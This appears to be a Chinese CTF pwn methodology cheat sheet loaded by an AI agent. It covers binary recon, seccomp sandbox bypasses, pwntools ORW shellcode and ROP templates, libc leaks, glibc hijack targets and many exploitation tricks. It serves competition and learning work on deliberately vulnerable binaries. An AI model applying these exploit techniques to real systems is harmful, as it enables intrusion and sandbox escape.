# Pwn 方法论 — 解题流程与决策速查

> 当遇到 pwn 类题目（提供二进制 + `nc` 远程连接）时通过 Read 工具加载。
> 自包含。堆利用详细模板见 `$SHARED_DIR/knowledge-base/pwn-heap-methodology.md`，内核利用见 `pwn-kernel-methodology.md`。

## 触发条件

- 题目提供 ELF/PE 二进制 + `nc <host> <port>` 远程连接
- `file <binary>` 显示 ELF executable，或 `checksec` 显示安全特性

## §1 标准 8 步流程

### 步骤 1：侦察
```bash
file <binary>                        # 确认架构（x86_64/aarch64）
checksec --file=<binary>             # 或 pwn checksec <binary>
ldd <binary>                         # 本地 glibc 版本
```
记录 mitigations 组合（NX/PIE/RELRO/Canary/FORTIFY），确定 glibc 版本（本地 `ldd --version`，远程靠 libc 泄漏偏移反查）。

### 步骤 2：逆向
用 IDA/Ghidra 梳理逻辑，定位漏洞类型：
- **菜单题**：找 add/edit/show/delete 功能，逐个检查边界
- **常见漏洞**：UAF（free 后指针未置空）/ OOB（索引未校验）/ DF（double free）/ 格式化字符串 / BOF（栈溢出）

### 步骤 3：沙箱检查
```bash
seccomp-tools dump ./<binary>        # 看是否 ORW 沙箱（禁了哪些 syscall）
```
如果禁了 `execve` → 需要用 ORW（open→read→write）链读 flag，不能用 system("/bin/sh")。

**seccomp 系统性评估**:
```bash
grep Seccomp /proc/self/status    # 0=未启用 1=strict(仅read/write/exit/sigreturn,几乎无法绕) 2=filter
grep NoNewPrivs /proc/self/status # 1=已设置(execve 提权也被禁)
```
dump 后三层分析: 白名单(默认 KILL)→找允许项的替代; 黑名单(默认 ALLOW)→更易绕; 架构检查仅 ARCH_X86_64 → x32 ABI 可绕。
**替代 syscall 表**: open→openat / open→**openat2**（437，Linux 5.6+，常被 filter 漏掉; struct open_how{flags;mode;resolve} 24B 作第 4 参）/ read+write→sendfile / execve→execveat / mmap→mmap2 / dup2→dup3 / stat→newfstatat。
**x32 ABI 绕过**: syscall 号 `| 0x40000000`（execve 59→0x4000003b）; RETF 切模式 cs=0x23(32-bit 兼容,号表不同)/0x33(64-bit)。
**fd 继承**: filter 在 open 之后安装 → 已有 fd 仍可用（查 /proc/self/fd/）。允许 ioctl/ptrace → 内核攻击面大。
容器: Docker 默认阻 ~44 个危险 syscall（mount/unshare/bpf/userfaultfd 等）; `--privileged`=全禁; K8s 不保证默认启用。

**深度绕过四路**:
- **类型宽度不匹配**（id 来自 games-and-vms-3）: seccomp BPF 对 64 位原始参数比较，内核 handler 可能 cast 到 32 位——`close(0x8000000000000002)` 过 "fd!=2" 检查但截断后关掉 fd 2，下一个 open 拿回 fd 2 走原本被封的 write; 对任何被滤 syscall 先查参数实际宽度
- **int 0x80 架构混淆**（filter 无 arch 检查时）: 64 位进程 `int 0x80` 发 32 位语义 syscall，号不同（execve 32 位=11, mmap=90, open=5, read=3, write=4, mprotect=125）→ 只匹配 64 位号表的 filter 放行。约束: 指针参数须低 4GB（MAP_32BIT）。有 `if arch != X86_64 → KILL` 则此路不通转 x32 ABI。
- **io_uring 绕过**（kernel 5.1-5.11）: seccomp 是 per-thread，io_uring 操作由 kworker 执行不继承 filter——提交 IORING_OP_OPENAT/READ/WRITE 在内核上下文跑。≥5.12 已修。
- **ptrace 注入**（ptrace 放行+能 fork）: 子进程 SIGSTOP → 父 attach → PTRACE_POKETEXT 写 syscall 指令 + SETREGS 设 rax/rdi/rsi/rdx/rip → 子进程执行任意 syscall。RET_TRACE 类 filter 配 ptrace 可改写 nr/args。
- **白名单组合升级**: splice+tee（fd 间搬数据）/ process_vm_readv（读他进程内存）/ prctl(PR_SET_NAME)（16B 内核可见通道）/ mmap+mprotect（RWX shellcode）/ memfd_create+execveat。RET_KILL=违规即死只能避开; **RET_ERRNO=进程存活可逐个探测放行状态**再系统性试替代号。sendfile ORW: read/write 全禁时 `open→sendfile(1,fd,0,len)`（SYS=40, len 在 r10）。
- **条件缓冲地址限制**: filter 对参数**地址**做 SCMP_CMP_LE/GE 检查（read 只准高窗、write 只准低窗、两窗不重叠）——shellcode 读进 read 允许窗后 `rep movsb` 搬到 write 允许窗再输出。
- **规则反汇编还原**: 静态/剥离符号时从 `seccomp_rule_add(ctx,action,nr,argc,arg_cmp*)` 手工还原——scmp_arg_cmp: +0x00 arg(uint)/+0x04 op(NE=1,LT=2,LE=3,EQ=4,GE=5,GT=6,MASKED_EQ=7)/+0x08 datum_a/+0x10 datum_b; default 0x7fff0000=ALLOW。产出参数条件表（含地址窗口边界）找黑名单缺口。
- **X 寄存器寻址盲区**: BPF `code=0x1d`（JEQ X）= "syscall 号==rdx" 比较——seccomp-tools 反汇编不了（显示 ???），filter 实际比看起来松: ROP 设 rdx=rax=59 即放行 execve。手工解析 sock_filter{code,jt,jf,k} 8 字节结构搜 0x1d; 工具 dump 结果须实测验证。
- **read 全禁时 mmap 文件映射**: open 被禁→openat(257); read 被禁→`mmap(NULL,0x1000,PROT_READ,MAP_PRIVATE,fd,0)` 把 flag 文件直接映射进内存再 write 输出——免 read syscall。其他替代: pread64(17)/readv(19)/writev(20)。

**ORW 链速查**（pwntools 是写漏洞利用脚本用的 python 库——`from pwn import *` 导入后 remote/process/asm/shellcraft 等函数全可用，以下模板均在此前提下）：
```python
# shellcode 版（有执行权限时）
sc  = shellcraft.pushstr('/flag')
sc += shellcraft.open('rsp', 0)            # fd in rax
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)
payload = asm(sc)

# ROP 版（NX，用 libc gadget）
rop = ROP(libc)
flag_str = next(libc.search(b'/flag\x00'))
bss_buf  = libc.bss(0x200)
rop.open(flag_str, 0); rop.read(3, bss_buf, 0x100); rop.write(1, bss_buf, 0x100)

# 禁 open 时用 openat（syscall 257）
rop.openat(-100, flag_str, 0)   # AT_FDCWD=-100
# 连 openat 也禁 → /proc/self/maps 找 flag 映射 / sendfile(40) / 布尔侧信道
```

### 步骤 4：构造原语
把漏洞升级为 **任意读 / 任意写 / 地址泄漏**：
- 堆：tcache poisoning / large_bin_attack / unsorted bin 泄漏
- 栈：格式化字符串（`%p` 泄漏 + `%n` 写）/ ROP

### 步骤 5：泄漏
```python
# 泄漏 libc 基址（unsorted bin fd 指向 main_arena 中的 unsorted bin 链表头）
leak = u64(p.recv(6).ljust(8, b'\x00'))
# 偏移因 glibc 版本而异（通常 main_arena+88 或 +96），用 pwndbg 确认或 pwntools DynELF 自动泄漏
libc_base = leak - (libc.symbols['main_arena'] + 96)  # 按实际版本调

# 泄漏堆基址（解 safe-linking）
heap_key = leaked_fd >> 12  # = fd 字段所在堆页的页号，必须先泄漏堆地址
```

**libc 版本识别（远程 libc 未知时）**:
- 原理: ASLR 只随机化高位，**低 12 位页内偏移恒定** → 只需低 12 位即可匹配版本
- 在线: libc.blukat.me / libc.rip 输入函数名+低 12 位
- 本地 libc-database: `./get ubuntu` → `./find puts 0x5a0 printf 0xe10`（**多函数交叉确认**）→ `./download <id>`
- 验证: `libc.address = leak - libc.sym['puts']` 后**必须以 000 结尾**（页对齐），否则泄漏解析有误
- LD_PRELOAD 换 libc 在 setuid 二进制不生效，优先 `$(dirname $PYTHON_CMD)/patchelf`

**DynELF 运行时符号解析（完全无 libc 线索时）**: 有可重复任意读原语（格式串 %s / puts(addr)+重入）时给 `DynELF(leak, elf=elf)` 提供 leak(addr) 回调，自动解析远程 .dynamic/link_map/符号表得 `d.lookup('system','libc')`——无需知道 libc 版本。低 12 位+libc-database 更快（需部分线索），DynELF 适合零线索且泄漏交互便宜场景。

**两阶段泄漏的返回目标**: stage1 泄漏后返回**main 里 `call vuln` 指令的地址**（而非 main 入口/vuln 入口）——call 指令建立干净栈帧，main 入口可能因 check_status/setup 破坏栈而崩。

### 步骤 6：落点选择
按 glibc 版本查 §3 决策树，选择劫持目标（hook/IO_FILE/exit_funcs/_rtld_global/TLS）。
详细伪造模板见 `pwn-heap-methodology.md`。

### 步骤 7：触发执行
```bash
one_gadget <libc.so>                 # 找 one_gadget（约束条件需满足）
```
- **约束满足技巧**: `[rsp+0x??]==NULL` 类用 `p64(0)` 填栈槽; 寄存器约束用 pop gadget 置 0; 全不满足 → 换 `system("/bin/sh")` 或栈迁移 ROP; `angry_gadget`（gem 包）提供更多候选; `one_gadget <libc> -l 2` 输出更多候选（约束更松）
- ORW 沙箱 → `open("/flag") → read(fd, buf, 0x100) → write(1, buf, 0x100)`

### 步骤 8：调试迭代
```bash
# 本地对齐远程 libc 版本
glibc-all-in-one/update_list.sh
glibc-all-in-one/download <libc_id>
patchelf --set-interpreter <ld_path> --set-rpath <libc_dir> <binary>
# 本地打通后打远程
```

## §2 mitigations 应对速查表

| 缓解 | 影响 | 应对策略 |
|------|------|---------|
| Full RELRO | GOT 不可写 | 转 IO_FILE / exit_funcs / _rtld_global / 栈 ROP |
| Partial RELRO | GOT 可写 | ret2dlresolve / 改 GOT |
| PIE | 代码地址随机 | 先泄漏代码基址（格式化字符串 / 任意读） |
| Canary | 栈溢出被检测 | 泄漏 canary / 爆破（fork 进程 256×7 次）/ TLS 覆盖法 / `__stack_chk_fail@GOT` 改无害函数（Partial RELRO）/ null byte 覆写泄漏 / 堆漏洞绕开（canary 只保护栈）|
| NX/DEP | 不可执行 shellcode | ROP / ret2libc / ret2csu |
| ASLR | 地址随机化 | 信息泄漏（unsorted bin / 格式化字符串）。注: Linux 5.18+ 弱化了 64-bit 可执行文件 ASLR；32-bit 且库 ≥2MB 时 ASLR 完全失效（影响爆破概率）。熵量化: 栈 22bit/mmap·libc 28bit/brk 堆 13bit/PIE 28bit → 64 位爆破不可行必须泄漏; PIE partial overwrite 末 2 字节单次 1/16 |
| seccomp(ORW) | 禁 execve | open→read→write 链；禁 open 则 openat / memfd_create |
| FORTIFY | 限制危险函数 | 换等价函数绕过 |
| **内核** SMEP | 内核不可执行用户页 | 内核 ROP / 栈迁移 / pt_regs 做内核 ROP |
| **内核** SMAP | 内核不可读用户页 | copy_from/to_user / msg_msg 等内核内数据 |
| **内核** KPTI | 隔离页表 | swapgs_restore 跳板返回用户态 |
| **内核** KASLR | 内核地址随机 | 结构体函数指针泄漏（tty_struct 等） |
| CET/Shadow Stack | 返回地址校验 | 改函数指针而非返回地址 / 合法栈帧。细化: Shadow Stack 只校验 ret——**JOP（jmp [reg]）不受检查**; IBT 要求间接跳转落 ENDBR64 → 用 ENDBR 开头 gadget 链; data-only（modprobe_path 等非控制流目标）是终极兜底 |
| CFI(kCFI/RFP) | 间接调用类型校验 | 同签名合法目标 / 非函数指针落点 |
| ARM PAC | 指针带签名 | 签名重用 / 已签指针直接用 |
| ARM MTE | 内存染色标签 | 概率爆破(1/16) / tag 旁路。深化: **in-bounds 利用优先**（同 tag 区域内相对偏移改字段，tag 永远匹配）/ tag oracle 时序侧信道 / LDGM-STGM 指令读写 tag / 推测执行窗口 |

**checksec 不可用时手动检查**:
```bash
readelf -l <bin> | grep GNU_STACK   # RW=NX 启用, RWE=栈可执行
readelf -h <bin> | grep Type        # DYN=PIE, EXEC=非 PIE
readelf -l <bin> | grep GNU_RELRO && readelf -d <bin> | grep BIND_NOW
# 有 RELRO 段+BIND_NOW=Full; 有段无 BIND_NOW=Partial(GOT 可写); 无段=No(.dynamic 也可写)
cat /proc/sys/kernel/randomize_va_space   # 0=关 1=部分 2=完全
```

**保护组合效应**: ASLR+PIE=代码数据双随机需两次泄漏（或相对偏移一次推算）; Full RELRO+glibc≥2.34=GOT 与 hooks 双堵 → _IO_FILE/exit_funcs/TLS_dtor_list 仅剩; CET+Full RELRO=ROP 与 GOT 双堵 → data-only; FORTIFY+Canary=格式串受限+栈溢出受检 → 优先堆路径。
**手上有 X 要 RCE 路由**: 格式串 only → 泄漏后覆写 GOT/hook; 栈溢出无泄漏 → ret2dlresolve/SROP（不需 libc 基址）; 任意写无泄漏 → partial overwrite .got.plt 低位重定向 win 函数; 任意写+libc 泄漏 → hook(<2.34)/FSOP(全版本)。
单进程关 ASLR（不改系统）: `setarch $(uname -m) -R ./vuln`。

## §3 glibc 版本 → 落点决策树

> **核心决策**：拿到任意写后，根据 glibc 版本选择劫持目标。

| glibc 版本 | 关键变化 | 推荐落点 |
|-----------|---------|---------|
| ≤ 2.33 | 有 `__malloc_hook` / `__free_hook` | hook + one_gadget（最简单） |
| 2.34 | 移除 hooks | exit_funcs / _rtld_global / IO_FILE |
| 2.35-2.39 | IO_FILE 攻击成熟 | **House of Apple/Cat** / large_bin_attack+IO / TLS |
| 2.42+ | 补 large_bin_attack、fastbin_reverse | House of Water/Tangerine / tcache_metadata_hijack / exit_funcs |
| 2.43+ | 补 fastbin_dup / house_of_mind_fastbin | 同 2.42+ |

**safe-linking（glibc ≥ 2.32，tcache/fastbin fd 异或保护）**：
```python
# PROTECT_PTR(pos, ptr): encrypted = (pos >> 12) ^ ptr  (pos = fd 字段所在地址, ptr = 目标地址)
# REVEAL_PTR(pos, enc):  ptr = enc ^ (pos >> 12)
# 绕过: 泄漏堆地址得到 pos>>12（堆页号，非 0），或 safe_link_double_protect 无泄漏法
```

**无 free 函数的场景** → House of Tangerine / sysmalloc_int_free（详见 `pwn-heap-methodology.md`）。

## §4 卡点突破表

| 卡点 | 突破方法 |
|------|---------|
| 无泄漏途径 | stdout 结构（`_flags`/`_write_ptr`）部分写刷出 libc；格式化字符串 `%p`；大堆溢出泄漏 unsorted bin fd |
| safe-linking 算不出 | unsorted bin fd 拿堆地址（fd 未加 safe-linking）；safe_link_double_protect 无泄漏法 |
| 远程打不通、本地通 | glibc 版本/patchelf rpath 未对齐 → glibc-all-in-one 下远程对应版本重新 patchelf |
| one_gadget 全失败 | 换 `system("/bin/sh")`；栈迁移 ROP；ORW 链 |
| 无 free 函数 | House of Tangerine / sysmalloc_int_free（利用 sysmalloc 对 top 的 _int_free） |
| 无 edit 功能（free 后不能改） | house_of_botcake / tcache_stashing_unlink / House of Water |
| 大量 free 无 edit | 同上，或 overlapping_chunks / poison_null_byte |
| 内核 UAF 只能拿同类对象 | cross-cache（跨 CPU partial list 排空 → 页回 buddy → 用别的 slab 回收） |
| userfaultfd 被禁 | FUSE 阻塞 / MADV_DONTNEED+并发 mprotect / io_uring stall / fallocate |
| 利用链崩在 CFI/PAC | 改用非函数指针落点：modprobe_path / Dirty PageTable / 任意文件写 |
| 远程超时 | 用 `context.log_level='debug'` 检查交互时序；pwntools `p.recvuntil` 而非 `sleep` |
| **栈迁移**（溢出空间小，ROP 链放不下） | 方法 A `leave;ret`：覆写 saved rbp = `chain_addr-8`、ret = `leave;ret` gadget → sp 迁到 chain。**双 pivot 变体**（溢出仅够 rbp+rip 时）: 先迁到 BSS 放 mini-ROP 调 `fgets(BSS+X, 0x700, stdin)` 装载完整链。方法 B `xchg rsp,rax;ret`（rax 持堆/bss 指针）⚠ **xchg rax,esp 在 64 位截断 rsp 高 32 位**——pivot 地址须在低 4GB（堆/mmap 常可，栈 0x7fff 不可）。方法 C `pop rsp;ret`。ARM64：找 `mov sp,x29` 控 x29 |
| **off-by-null 栈迁移** | off-by-null 清 saved rbp 最低字节（15/16 概率 rbp 偏移到可控 buffer）→ `leave;ret`（等价 `mov rsp,rbp;pop rbp`）→ main 返回时 RSP 落入被 overflow 的 buffer。buffer 铺满 `ret` gadget（ret sled）提高命中概率，末尾放真实 ROP 链 |
| **格式化字符串偏移定位** | x86-64：`%1`~`%5` 读 rsi/rdx/rcx/r8/r9，`%6` 起读栈。发 `AAAAAAAA %6$p` 数到 `0x4141414141414141`。一键构造：`fmtstr_payload(offset, {addr: val}, write_size='byte')`。ARM64：`%1`~`%8` 读 x0-x7，`%9` 起读栈 |
| **格式串手动写入**（自动化不可用时） | %hn 分段: 拆 HOB/LOB 先写小值再写大值（差值做 `%Nc` padding）; 64 位地址含 \x00 必须放 payload 尾部; 多轮用 FmtStr 类 `fs.write()+execute_writes()`。⚠ `_FORTIFY_SOURCE=2`（见 `__printf_chk` 符号）**只拦 %N$ 位置参数与 %n 组合**——顺序 %n/%hn 链仍可用（计数需极精确）; 必须用 %N$n 时才换越界写/UAF 写原语 |
| **格式串补充** | 写入宽度: %hhn(1B)/%hn(2B)/%n(4B)/**%ln(8B)**; 64 位地址 48 bit → 3×%hn 或 6×%hhn。GOT 目标补充: `atoi@GOT→system`（发 "sh" 当"数字"）。**盲格式串七步**: %p×50 dump → 按模式分类地址（0x7f/0x7ff/代码段）→ AAAA%N$p 定输入偏移 → 推基址 → %N$s 读 GOT → 算 libc → 覆写收尾（格式串自身是读原语，盲打远比 BROP 便宜）。**格式串不在栈上（堆缓冲）**: 找栈上已有指针链（saved RBP 链典型）——%A$hn 改 ptr 低位指向 target，再 %B$hn 经它写出（两段写，第一段只需改低 2 字节不需全栈泄漏）|
| **GDB 与实际运行地址不一致** | qemu-gdb 注入 LINES/COLUMNS 环境变量改变栈布局 → `unset env LINES` `unset env COLUMNS` 后重测; 静态链接无符号定位输入点: 运行→等输入→Ctrl+C→`bt` 看 read 调用链。exploit 崩溃排查顺序: ①16 字节栈对齐(加 RET gadget, system 内 movaps) ②坏字符 \x00\x0a\x0d ③地址计算 qemu-gdb verify ④远程 libc 差异 |
| **单次触发不够（Eternal Loop）** | ① ROP 尾接 main 导回漏洞点 ② 覆写 exit@GOT → 漏洞函数（退出即重入）③ `.fini_array` 双函数: [漏洞函数, `__libc_csu_fini`]（后者重新调用 .fini_array → 永久循环; 需 **No RELRO**——Partial/Full 下 .fini_array 随 GNU_RELRO 段启动后只读，别信"Full RELRO 也能改 fini_array"的说法）。静态二进制无 GOT 可劫时 _fini_array 是天然 re-entrant 回调表，双条目+add rsp,N;ret 下探可分段拼接 ROP |
| **无 pop rdx / gadget 极少 / 静态二进制** | **SROP**: pop rax=15(rt_sigreturn)+syscall;ret 两 gadget 即可，SigreturnFrame 一次设全部寄存器+可迁 rsp（帧含 rsp 字段）|
| **无泄漏途径且 No/Partial RELRO** | **ret2dlresolve**: 伪造 Elf_Rel/Sym/"system" 字符串让 _dl_runtime_resolve 解析——不需 libc 基址; pwntools `Ret2dlresolvePayload` 自动化; 64 位注意 VERSYM 合法与 24B 对齐 |
| **需要 3 参数但无 pop rdx** | **ret2csu**: csu_pop(rbx,rbp,r12-r15)+csu_call（mov rdx,r13;rsi,r14;edi,r15d; call [r12+rbx*8]）——r12 须指向**函数指针地址**（GOT）、rbx=0/rbp=1 跳循环、edi 只 32 位、call 后 56B padding。PIE 未泄漏/静态无 csu 时转 SROP |
| **拿不到二进制（盲打远程 fork 服务）** | **BROP**: ①逐字节爆破偏移+canary（子进程布局不变）②找 stop gadget（不 crash 的挂起地址）③探测 6-pop csu gadget（候选地址后接 6 个 A + stop，存活即命中）④PLT 16B 间隔迭代探测 puts/write ⑤puts 逐页 dump 二进制 ⑥转标准 ROP |
| **CET 拦 ROP** | **JOP**: dispatcher `add rax,8; jmp [rax]` 表驱动串联——jmp 不走 shadow stack 校验（IBT 要求 ENDBR 落点）; COP 用 call [reg] 链（部分受 IBT 限制）。**用户态自实现影子栈**: 漏洞在实现自身——shadow_stack_ptr 递增无界检查，可控递归 N 次（N=(可控缓冲-数组)/8）让指针落相邻用户可写 .bss（username 类）→ 写 win 进去 → 硬件栈与影子栈同值校验通过。硬件 CET 全开无影响 |
| **MIPS/ARM32 目标** | MIPS: 常无 NX 先试栈 shellcode; **branch delay slot 必执行**（链排布须计入）; jalr $t9+$a0-$a3; **cache 一致性**——写后执行前 sleep(1) 刷 I-cache 否则崩。ARM32: `pop {r0-r3, pc}` 一次控 4 参数; Thumb 混合模式 gadget 池翻倍（地址 LSB=1 切换; Thumb 指令更易避开 null）; NOP=0xe1a00000; dup2 循环 svc #1。**ARM64 无 pop x0**: 找返回值为常量指针的 libc 函数——`getusershell()` 返回 "/bin/sh" 落 x0（=首参寄存器）→ 两调用链 getusershell+system 免装载; getenv("SHELL")/tmpnam 同族; 适用返回寄存器==首参寄存器的全部 ABI（ARM/MIPS v0/RISC-V a0）。**m68k**: 号在 d0/参 d1-d3/`trap #0`（read=3,write=4,dup2=63,execve=11）; 14B 极限一段改 d3=256 跳回程序自身 read 重用 fd+RWX。**DOS COM 实模式**: 代码段可写、int 0x21（ah=3d open/3f read/09 打印 $ 串） |
| **32-bit 旧内核（<3.18 嵌入式）** | **ret2vdso**: vDSO 内 sigreturn gadget（<2.6.18 固定 0xffffe000 / 2.6.18-3.17 仅 8bit 熵可爆破）→ SROP。**64 位版**: vDSO 虽完全随机，但栈上 auxv 的 **AT_SYSINFO_EHR(type 0x21)** 存 vDSO 基址——栈泄漏后 dump 栈搜 0x21+页对齐 0x7f 值定位，再 dump vDSO 本地找 gadget（vDSO 内核特定必须 dump 远程）→ 静态二进制零 gadget 场景主力 |
| **PIE 未泄漏又需 ret 对齐** | **vsyscall 固定地址 ret**: 0xffffffffff600000/0x400/0x800 三条目各 +0x9 处 ret，不受 ASLR/PIE 影响，当 NOP-ret 滑到 partial overwrite。⚠ 现代内核 emulate/none（vsyscall=none 禁用）模式，用前 `cat /proc/self/maps \| grep vsyscall` 验证 |
| **目标程序是 SUBLEQ OISC**（单指令集 VM） | 唯一指令 `*dst -= *src; if (*dst <= 0) goto addr` 可链式构造任意读/写（减法即写原语、自减清零+借位构造值）。函数指针经 **PTR_MANGLE** 混淆存储（ROL17(ptr^secret)，secret 在 TLS fs:[0x30]）: ①partial leak 泄 secret ②算 unmangled 目标 ③写 mangled 指针进 SUBLEQ 内存。secret 恢复另两路: TLS 直接泄漏/ `_dl_fini` 已知明文——见 pwn-heap 落点 B |
| **shellcode 输入极小（~9B）+寄存器清零** | **syscall RCX 副作用**: syscall 把下条指令地址存 RCX——`syscall(nop); mov rsi,rcx; mov dl,0xff; syscall` 共 10B 拉入大二阶段（stager 模式: 一阶段只需已知地址+read 参数+syscall）。ORW flag 路径常见: flag / /flag / /flag.txt / **/proc/self/environ** |
| **数据重解释类漏洞**| ① 模拟器宽寄存器寻址窄缓冲（I 寄存器 16 位 vs mem[4096]）→ 越界直达宿主栈 ret2libc（qemu-gdb 定标一次偏移）; ② **float qsort 排序即写入**——输入位模式合适的 double 让排序把 canary 归位+win 地址落 RIP 槽（无需写原语）; ③ `abs(INT_MIN)` UB 返回原值 → 负索引 `% size` 写 BSS 相邻结构（爆破 hash==0x80000000; 防御 `(unsigned)hash % size`）|
| **无泄漏途径（socket fd 操纵法）** | 线程服务器 + BOF 能改 fd：① BOF 替换 fd → close 原 fd ② 给另一个等待 `read` 的 socket 发 RST 包 → `read` 返回 -1 ③ 未初始化栈缓冲通过被替换的 fd 泄漏到另一个 socket |
| **core_pattern 攻击面** | 脆弱程序注册在 `/proc/sys/kernel/core_pattern` → 构造畸形 ELF 触发崩溃 → core dump 处理器解析 ELF symtab/strtab 时 OOB 读 flag |
| **tcache 被禁用** | fastbin double free + 利用 `malloc_consolidate`（top 不可用但 fastbin 存在时自动触发，合并 fastbin 到 unsorted bin 构造堆布局）。⚠2.43 补 fastbin_dup 后需换路 |
| **gadget 池枯竭**（小二进制） | `cmp`/`mov`/`test` **大立即数的操作数字节**可解码为 gadget: `cmpl $0xc35e415f,-0x4(%rbp)` 编码 `81 7d fc 5f 41 5e c3`，+3 起 = `pop rdi;pop r14;ret`。pwntools `ROP(elf)` 自动扫非对齐入口 |
| **步长可控遍历泄漏** | 遍历函数步长（rate）用户可控 + null 终止符停止 → rate>bufsize 时索引跳过 `\0` 继续读相邻栈数据。rate=目标偏移即逐字节读 canary(1-7 字节)/ret addr(低 6 字节)——破 canary+PIE，比 null byte 覆写泄漏少一次写破坏 |
| **索引边界检查缺陷** | ① 只查索引未乘步长: `if(v2<=0xFC) read(0,&array[12*v2],0xC)` —— 12*v2 最大 0xBC4 越界; 有效上界=max_byte_offset/stride。② 有符号比较: `if(v5<=31) table[v5]=x`（v5 int）实际允许 [INT_MIN,31]，负索引写前向 GOT（先负索引读 leak 再覆写 system）。静态查 `-Wsign-conversion`。同族: **先除后乘截断**（`4*(ticks/1000)` 在 1500 时=4 而非 6——off-by-N 随输入增大）; **索引起点差一**（index 0 写 entries[-1] 可重叠 struct 的 size 字段——改大 size 使 print_all 超 dump 泄漏 canary/ret） |
| **协议长度字段 overread** | 回显字节数取自客户端 length 字段 → length>实际数据即泄漏相邻栈/堆（类 Heartbleed）。泄漏中按 8 字节对齐搜 `0x7f0000000000~0x7fffffffffff` 定位 libc/栈指针。审计: 长度须 min(length, actual_received) |
| **解析器溢出到 epilogue 就崩** | memcpy 在长度校验前执行的解析器溢出，epilogue pop callee-saved 寄存器先于 ret——恢复清单: ①读 prologue 确认 push 顺序（epilogue 逆序恢复）②rbx→可读内存（BSS/GOT）③循环计数寄存器（r12/r13）→ 退出条件值（如 1）④win 前加 ret 对齐。payload 须包合法文件格式容器（有效头+记录头） |
| **MAC/token 恒真绕过** | 比较长度来自客户端: `strncmp(expected,supplied,n)`，n=0 恒返回 0——任意令牌通过。memcmp/bcmp 同理。防御: 拒绝 n<=0 或 CRYPTO_memcmp 定长比较 |
| **单字节覆写确定性场景** | 无概率损失的 partial overwrite 两式: ① 返回地址 LSB 改指向**同函数内**另一次 read() 之前——read 重触发且参数栈上可控，完全绕 ASLR（"重调用原语"）; ② 栈上函数指针目标函数与原函数**同 4KiB 页**——低 12 位链接期固定，0xBC→0xA9 单字节换函数无需泄漏 |
| **写循环跳不过 canary** | scanf 格式不匹配跳过原语: 输入 `-`（匹配 %d 前缀但转换失败）→ **不写目标也不消费输入**，后续迭代同样空转——固定次数写循环中让 canary/RBP 槽位迭代空转直达 ret。配套: signed 检查 `(char)count>20` + unsigned 迭代 `for(uint8_t i=0;i<count;++i)` 发 128 得 128 次越界写 |
| **ROP 写的数据含坏字符** | 法1 **XOR 原地解码**: `pop r14;r15`+`mov [r15],r14`+`xor [r15],r14` 三 gadget——编码值写入 .data 再逐块 xor 解回（key=2/0x41 常够）。法2 **sprintf 单字节拷贝**: sprintf(dst,src) 从 src 拷到 null——src 指向二进制内"目标字节+\x00"地址即单字节复制，逐字节拼到 BSS（源地址本身也须无坏字符; 需 pop3ret 清栈）|
| **无 mov [reg],reg 写 gadget** | **异种指令链**（出题人常埋 questionableGadgets 段）: 64 位 BEXTR+XLAT+STOSB——`bextr rbx,rcx,rdx`(rdx=0x4000,rcx=addr-补偿add) 载地址 → `xlat [rbx]` 取字节到 al → `stosb [rdi]` 写入且 rdi++。32 位 PEXT+BSWAP+XCHG——贪心求 mask 使 PEXT(0xb0bababa,mask)=目标字节 |
| **rdx 被 libc 调用砸掉** | puts 等调用后 rdx 变小值，后续 read(fd,buf,rdx) 失效。三路: ① libc 内找 `pop rdx;pop rbx;ret`（2.35 约+0x904a9，rbx 填垃圾）② 重入二进制 read setup: `pop rbp` 设 rbp=TARGET+0x40 后跳 `lea rax,[rbp-0x40];mov edx,0x100;...;call read` → read(0,TARGET,0x100)，⚠其后 leave;ret 天然栈迁移到 rbp（下段 ROP 写进 read 的数据 rbp+8 处）③ raw syscall 链绕过 libc prologue（CET/栈问题免疫）|
| **无 pop rax 设不了系统调用号** | **read 返回值即 rax**: 总输入长度精确=目标 syscall 号（如 0x142=stub_execveat），read 返回后 rax 恰好就绪，配 `xor rdx,rdx;syscall`/裸 syscall gadget。execveat 用 AT_FDCWD 参数同 execve。通用: 任何返回值可控函数（read/write 长度、atoi）都是 rax 设置器; 对照 替代表找号码可达的功能等价调用 |
| **要 rdx=0 但无 pop rdx** | **canary 校验 epilogue 当 gadget**: `mov rdx,[rsp+8]; xor rdx,fs:0x28`——canary 完好时结果恒 0。跳入该序列获 rdx=0（副作用仅无害比较跳转），每个开 canary 的函数都有（搜 `xor rdx, qword ptr fs:`）。三参数完整控制仍优先 ret2csu |
| **shellcode 须全字母数字** | 字母数字编码器（自解码 stub）要求入口 `rax+padding_len==shellcode 地址`; harness 进 rax=0 时前置 3B 种子 `push r12;pop rax`（0x41 0x54 0x58="ATX" 恰全字母数字）——r12 Linux 上常驻 _start 地址; 编码器 padding_len=3 补偿 |
| **shellcode 空间十几字节** | ① 入口寄存器审计前置: qemu-gdb 断点 `info registers`，调用方残留 eax=syscall 号/ebx=fd 直接复用只补缺参（32 位 write 场景 7B 够）② 压缩: `cdq`(1B) 清 edx / `push+pop`(2B) 代 mov(3B) / `push imm8;pop rax` 设小号 ③ 加密通道按块放行时 CBC 构造 `IV=AES_decrypt(已知密文块)^目标明文` 让首块解密出任意 shellcode。stager 模式见上表「syscall RCX 副作用」行。**4 字节×多轮执行版**: callee-saved r12-r15 跨迭代持久当状态存储——`add r12,[rsp]` 累积泄漏（4096 循环放大时序）/ `mov [r15],r12b` 逐字节构造 / `push rsp;pop rdi;push r15` 恰 4B 迁移 |
| **payload 须全合法 UTF-8** | 优先 **SROP**（仅 3 个 gadget 须过校验）。sigframe 寄存器字段 8B 连续——违规连续字节（0x80-0xBF）做 3 字节序列中段，**leader 字节(0xE0-0xF7)放前一寄存器字段末字节**让序列跨字段边界合法化（r15 末 0xE0 + rdi 头 B0 9F = U+0C1F）。任何结构化数据过 UTF-8 校验同理 |
| **seccomp 只留 open/read 禁全部输出** | **时间盲外带**: shellcode 逐字节 cmp 猜测值，匹配则烧 CPU 循环（inc ecx 到 0xffffffff 约 4s）再 exit——响应时间差即 oracle，~95×flag_len 次连接。无输出函数的裸机/嵌入式同样适用。**9 字节极小版**: `test BYTE PTR [rip+2],imm8`(7B)+`je 0`(2B)——位与立即数无交集→死循环挂起，有交集→崩溃; 立即数按 1/2/4/8 探测，每连接 1 bit（挂起 vs 崩溃时间差），比烧循环更省字节 |
